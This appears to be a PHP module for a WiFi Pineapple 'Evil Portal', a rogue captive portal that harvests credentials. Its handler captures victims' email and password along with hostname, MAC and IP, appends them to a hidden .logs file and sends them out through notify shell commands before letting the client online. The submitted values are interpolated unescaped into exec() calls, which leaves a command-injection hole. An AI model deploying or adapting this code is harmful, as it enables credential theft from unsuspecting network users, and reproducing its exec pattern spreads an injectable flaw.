<?php namespace evilportal;

class MyPortal extends Portal
{
    public function handleAuthorization()
    {
        if (isset($_POST['email'])) {
            $email = $_POST['email'];
            $pwd = $_POST['password'];
            $hostname = $_POST['hostname'];
            $mac = $_POST['mac'];
            $ip = $_POST['ip'];

            $reflector = new \ReflectionClass(get_class($this));
            $logPath = dirname($reflector->getFileName());

            file_put_contents("{$logPath}/.logs", "[" . date('Y-m-d H:i:s') . "Z]\nemail: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);

            $this->execBackground("notify '$email - $pwd'");
            exec("pineapple notify '$email - $pwd'");

            // Explicitly authorize the client after capturing credentials
            $this->authorizeClient($mac);
        }

        // Ensure parent authorization handling completes the process
        parent::handleAuthorization();
    }

    public function onSuccess()
    {
        parent::onSuccess();
    }

    public function showError()
    {
        parent::showError();
    }
}
